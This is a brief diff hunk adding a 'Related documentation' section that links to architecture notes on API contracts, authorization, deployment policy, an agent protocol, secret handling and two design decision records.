+## 13. Related documentation
+
+- `docs/architecture/api-contract.md` — API contract, security boundary
+- `docs/architecture/authorization.md` — the deliberate 404-hiding divergence
+- `docs/architecture/deployment-policy.md` — deployment gates and policy rules
+- `docs/architecture/agent-protocol.md` — protocol and security mapping
+- `docs/architecture/secret-handling.md` — secret lifecycle
+- `docs/adr/0005-traefik-reverse-proxy.md`, `docs/adr/0008-agent-engine-communication.md`
